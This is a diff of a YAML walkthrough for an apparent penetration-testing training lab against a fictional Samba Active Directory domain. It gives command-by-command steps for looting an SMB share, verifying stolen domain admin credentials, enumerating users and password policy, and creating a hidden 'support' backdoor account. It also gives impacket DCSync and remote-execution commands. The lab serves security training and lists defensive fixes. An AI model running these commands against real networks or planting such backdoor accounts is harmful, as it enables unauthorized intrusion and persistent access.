@@ -473,31 +473,49 @@ walkthrough:
 
             > **The credentials work!** This confirms password reuse between systems.
 
-        - id: explore-domain
+        - id: step3_2
           vm: kali
-          title: "Explore the Domain"
+          title: "Access the Sensitive Share"
           content: |
-            Now that we have domain admin credentials, let's explore the Active Directory structure.
+            ## Exploring the File Server
 
-            **List domain users with ldapsearch:**
-
-            ```bash
-            LDAPTLS_REQCERT=never ldapsearch -x -H ldap://172.16.2.12 -ZZ \
-              -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
-              -w 'Adm1n2024' \
-              -b 'cn=Users,DC=acmewidgets,DC=local' \
-              '(objectClass=user)' sAMAccountName
-            ```
-
-            > **Note:** `LDAPTLS_REQCERT=never` is needed because the domain controller uses a self-signed certificate. The `-ZZ` flag enables StartTLS encryption which Samba AD requires.
-
-            **Alternative: Use rpcclient to enumerate users:**
+            Now connect to the sensitive share and look for interesting files:
 
             ```bash
-            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c enumdomusers
+            smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024'
             ```
 
-            This shows all domain user accounts including service accounts like `svc_backup` that may have elevated privileges.
+            Once connected, list the contents:
+            ```
+            smb: \> ls
+            ```
+
+            ### What Do You See?
+
+            Look for files like:
+            - `passwords.txt` - Password lists
+            - `*.kdbx` - KeePass databases
+            - `*.xlsx` - Excel files with data
+            - `backup_*` - Backup scripts with hardcoded creds
+
+            ### Download Interesting Files
+
+            ```
+            smb: \> get passwords.txt
+            ```
+
+            Exit the SMB session:
+            ```
+            smb: \> exit
+            ```
+
+            ### Read the File
+
+            ```bash
+            cat passwords.txt
+            ```
+
+            > **What did you find?** Move to the next step to see the critical discovery!
 
         - id: step3_3
           vm: kali
@@ -540,38 +558,40 @@ walkthrough:
       steps:
         - id: step4_1
           vm: kali
-          title: "Understanding Domain Attacks"
+          title: "Verify Domain Admin Credentials"
           content: |
-            ## Domain Compromise Techniques
+            ## Testing the Domain Admin Password
 
-            With the Domain Admin credentials from `passwords.txt`, you now have the keys to the kingdom. Let's explore what this access enables.
+            You found `Adm1n2024` in the passwords.txt file. Let's verify it actually works!
 
-            ### About This Lab Environment
+            ### Test Authentication via SMB
 
-            This lab uses **Samba 4 AD** (Linux-based) instead of Windows Server. This is common in:
-            - ARM-based environments (M1/M2 Macs, ARM servers)
-            - Cost-conscious deployments
-            - Linux-centric organizations
+            ```bash
+            smbclient -L //172.16.2.12 -U 'Administrator%Adm1n2024'
+            ```
 
-            ### Windows vs Samba: What's Different?
+            **Expected output:** A list of shares including `sysvol` and `netlogon` - these are only visible to authenticated domain users.
 
-            | Attack | Windows AD | Samba AD |
-            |--------|-----------|----------|
-            | DCSync (secretsdump) | ✅ Works | ❌ Not supported |
-            | PSExec/WMIExec | ✅ Works | ❌ No Windows services |
-            | SMB Share Access | ✅ Works | ✅ Works |
-            | LDAP Enumeration | ✅ Works | ✅ Works |
-            | RPC Enumeration | ✅ Works | ✅ Works |
+            ### Test RPC Authentication
 
-            > **Real-world note:** In Windows AD environments, you'd use `impacket-secretsdump` for DCSync to extract all password hashes. That attack isn't available here, but the enumeration skills transfer directly.
+            ```bash
+            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'getusername'
+            ```
+
+            **Expected output:**
+            ```
+            Account Name: Administrator, Authority Name: ACMEWIDGETS
+            ```
+
+            > **The credentials work!** You now have Domain Administrator access.
 
         - id: step4_2
           vm: kali
-          title: "Domain Enumeration"
+          title: "Enumerate the Domain"
           content: |
-            ## Enumerate the Domain
+            ## Mapping the Domain
 
-            With Domain Admin credentials, let's map out the entire domain.
+            With Domain Admin credentials, let's discover everything about this network.
 
             ### List All Domain Users
 
@@ -579,12 +599,24 @@ walkthrough:
             rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'enumdomusers'
             ```
 
-            ### Get Detailed User Information
+            **Expected output:**
+            ```
+            user:[Administrator] rid:[0x1f4]
+            user:[Guest] rid:[0x1f5]
+            user:[krbtgt] rid:[0x1f6]
+            user:[jsmith] rid:[0x3e8]
+            user:[mwilliams] rid:[0x3e9]
+            user:[svc_backup] rid:[0x3ea]
+            ```
+
+            ### Get User Details
 
             ```bash
-            # Get info about a specific user (500 = Administrator RID)
-            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'queryuser 500'
+            # Query the svc_backup account (RID 0x3ea = 1002)
+            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'queryuser 0x3ea'
             ```
+
+            Notice the **description field** - it reveals the account's purpose!
 
             ### Enumerate Domain Groups
 
@@ -592,91 +624,143 @@ walkthrough:
             rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'enumdomgroups'
             ```
 
-            ### List Domain Admins Group Members
+            ### Who's in Domain Admins?
 
             ```bash
-            # Group RID 512 = Domain Admins
+            # RID 512 = Domain Admins group
             rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'querygroupmem 512'
             ```
 
-            > **What you're learning:** These enumeration techniques work on both Windows and Samba AD. This is how attackers map out an organization after gaining initial access.
+            > **These enumeration skills transfer directly to Windows AD.** Master them here, use them everywhere.
 
         - id: step4_3
           vm: kali
-          title: "Prove Domain Admin Access"
+          title: "Check Password Policy"
           content: |
-            ## Verify Full Domain Control
+            ## Password Policy Enumeration
+
+            Understanding the domain's password policy helps plan attacks like password spraying.
+
+            ### Get Domain Password Policy
+
+            ```bash
+            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'getdompwinfo'
+            ```
+
+            **What to look for:**
+            - **Minimum password length** - Short = weak passwords likely
+            - **Password complexity** - Disabled = simple passwords
+            - **Lockout threshold** - How many guesses before lockout?
+
+            ### Get Account Lockout Policy
+
+            ```bash
+            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'getusrdompwinfo 500'
+            ```
+
+            > **Why this matters:** If there's no lockout (or high threshold), you could spray passwords against all users. In this lab, you already have Domain Admin, but in real engagements this is valuable recon.
+
+        - id: step4_4
+          vm: kali
+          title: "Prove Domain Control"
+          content: |
+            ## Demonstrate Full Domain Access
 
             The ultimate proof of domain compromise is accessing protected resources.
 
             ### Access SYSVOL (Domain Admin Required)
 
-            SYSVOL contains Group Policy objects and is only writable by Domain Admins:
+            SYSVOL contains Group Policy objects. Only Domain Admins can write here:
 
             ```bash
             smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024' -c 'ls'
             ```
 
-            ### Access All Shares on DC
+            ### Access NETLOGON Share
 
             ```bash
-            smbclient -L //172.16.2.12 -U 'Administrator%Adm1n2024'
+            smbclient //172.16.2.12/netlogon -U 'Administrator%Adm1n2024' -c 'ls'
             ```
 
-            ### Access File Server with Domain Admin
+            ### Cross-Domain Access
 
-            Domain Admin credentials work across all domain-joined systems:
+            Domain Admin credentials work on ALL domain-joined systems:
 
             ```bash
+            # Access sensitive share on file server using Domain Admin
             smbclient //172.16.2.10/sensitive -U 'Administrator%Adm1n2024' -c 'ls'
             ```
 
-            ### What This Means
+            > **Notice:** You accessed the file server with Domain Admin credentials, not svc_backup. This demonstrates domain-wide access.
 
-            With Domain Admin access, an attacker can:
-            - **Read/write any file** on domain-joined systems
-            - **Create new admin accounts** for persistence
-            - **Deploy malware** via Group Policy
-            - **Access all user data** across the organization
+        - id: step4_5
+          vm: kali
+          title: "Create a Backdoor Account"
+          content: |
+            ## Persistence: Adding a Backdoor
 
-            > **You now have complete domain control!**
+            A common post-exploitation technique is creating a hidden admin account for persistent access.
 
-            ### In a Windows Environment
+            ### Create a New Domain User
 
-            With Windows AD, you would also:
             ```bash
-            # DCSync - extract all password hashes
-            impacket-secretsdump 'DOMAIN/Administrator:Password@DC_IP'
-
-            # Remote code execution
-            impacket-psexec 'Administrator:Password@TARGET_IP'
-            impacket-wmiexec 'Administrator:Password@TARGET_IP'
+            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'createdomuser support'
             ```
+
+            ### Set the Password
+
+            ```bash
+            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'setuserinfo2 support 24 P@ssw0rd123!'
+            ```
+
+            ### Verify the Account Exists
+
+            ```bash
+            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'enumdomusers' | grep support
+            ```
+
+            ### Test the New Account
+
+            ```bash
+            smbclient -L //172.16.2.12 -U 'support%P@ssw0rd123!'
+            ```
+
+            > **In real environments:** Attackers create accounts like "support", "svc_scanner", or "admin2" that blend in. Blue teams should monitor for unexpected account creation.
+
+            ### Why This Matters
+
+            With Domain Admin access, attackers can:
+            - ✅ **Create new admin accounts** for persistence
+            - ✅ **Read/write any file** on domain systems
+            - ✅ **Access all user data** across the organization
+            - ✅ **Modify Group Policy** (in Windows AD)
+
+            > **You now have complete domain control with a persistent backdoor!**
 
     - id: phase5
       name: "Post-Exploitation"
       steps:
         - id: step5_1
           vm: kali
-          title: "Advanced Enumeration with LDAP"
+          title: "LDAP Deep Dive"
           content: |
             ## LDAP Enumeration
 
-            Beyond RPC, LDAP gives you detailed directory information. This is valuable for mapping the organization structure.
+            LDAP provides more detailed information than RPC. Let's extract everything.
 
-            ### List All Domain Users via LDAP
+            ### List All Users with Details
 
             ```bash
             ldapsearch -x -H ldap://172.16.2.12 \
               -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
               -w 'Adm1n2024' \
               -b 'cn=Users,DC=acmewidgets,DC=local' \
-              '(objectClass=user)' sAMAccountName description
+              '(objectClass=user)' sAMAccountName description memberOf
             ```
 
             ### Find Service Accounts
 
-            Service accounts often have elevated privileges:
+            Service accounts often have elevated privileges and weak passwords:
 
             ```bash
             ldapsearch -x -H ldap://172.16.2.12 \
@@ -686,7 +770,7 @@ walkthrough:
               '(description=*service*)' sAMAccountName description
             ```
 
-            ### Check Domain Admin Group Members
+            ### Export Domain Admin Members
 
             ```bash
             ldapsearch -x -H ldap://172.16.2.12 \
@@ -696,7 +780,49 @@ walkthrough:
               '(cn=Domain Admins)' member
             ```
 
-            > **Pro tip:** In real engagements, you'd export this data and analyze it offline to find attack paths, service accounts, and high-value targets.
+            > **Pro tip:** In real engagements, export this data to a file and analyze offline to find attack paths and high-value targets.
+
+        - id: step5_2
+          vm: kali
+          title: "Windows AD: What's Different"
+          content: |
+            ## Windows AD Attacks (Educational Reference)
+
+            This lab uses Samba AD. In a **Windows AD** environment, you'd have additional attack options.
+
+            ### DCSync Attack (Windows Only)
+
+            DCSync replicates password hashes directly from a Domain Controller:
+
+            ```bash
+            # This would work on Windows AD, NOT in this lab
+            impacket-secretsdump 'ACMEWIDGETS/Administrator:Adm1n2024@DC_IP'
+            ```
+
+            **Why it doesn't work here:** DCSync uses Windows DRSUAPI (replication protocol). Samba doesn't implement this.
+
+            ### Remote Code Execution (Windows Only)
+
+            ```bash
+            # PSExec - creates a service on target
+            impacket-psexec 'Administrator:Adm1n2024@TARGET_IP'
+
+            # WMIExec - uses Windows Management Instrumentation
+            impacket-wmiexec 'Administrator:Adm1n2024@TARGET_IP'
+            ```
+
+            **Why these don't work here:** They require Windows services (SCM, WMI) that don't exist on Linux/Samba.
+
+            ### What DOES Transfer
+
+            The skills you practiced work everywhere:
+            - ✅ SMB enumeration and authentication
+            - ✅ RPC-based user/group enumeration
+            - ✅ LDAP queries and data extraction
+            - ✅ Password policy analysis
+            - ✅ Account creation for persistence
+
+            > **Real-world insight:** Many networks mix Windows and Linux. Knowing both attack surfaces makes you more effective.
 
         - id: step5_3
           vm: kali
@@ -724,24 +850,34 @@ walkthrough:
                            └── Domain Admin: Adm1n2024
 
             4. DOMAIN COMPROMISE
-               └── SMB access to DC01 SYSVOL
-                   └── Full admin access to:
-                       - dc01 (Domain Controller)
-                       - fileserver
-                       - All domain resources
+               └── Authenticated to DC01 (172.16.2.12)
+                   └── Enumerated all users and groups
+                       └── Checked password policies
+                           └── Created backdoor "support" account
+
+            5. PERSISTENCE
+               └── Backdoor account: support / P@ssw0rd123!
+                   └── Full domain access established
             ```
 
             ## Defensive Lessons
 
             | Vulnerability | Fix |
             |--------------|-----|
-            | SQL Injection | Parameterized queries |
-            | Plaintext passwords | Use a secrets manager |
-            | Password reuse | Unique passwords + MFA |
-            | Sensitive files on share | Proper access controls |
-            | Excessive service account rights | Least privilege |
+            | SQL Injection | Parameterized queries, input validation |
+            | Plaintext passwords in files | Use a secrets manager (Vault, AWS Secrets) |
+            | Password reuse | Unique passwords + MFA everywhere |
+            | Sensitive files on shares | Proper ACLs, audit access |
+            | No account creation alerts | Monitor for new accounts (SIEM) |
+            | Service accounts with file access | Least privilege, no interactive logon |
 
-            > **Remember:** Only use these techniques with explicit authorization!
+            ## Next Steps for Learning
+
+            1. **Try attacking differently** - Can you get Domain Admin without using passwords.txt?
+            2. **Blue team it** - How would you detect each attack step?
+            3. **Expand your skills** - Try Kerberoasting, AS-REP roasting in Windows labs
+
+            > **Remember:** Only use these techniques with explicit written authorization!
 
 # Training scenario events (MSEL)
 events:
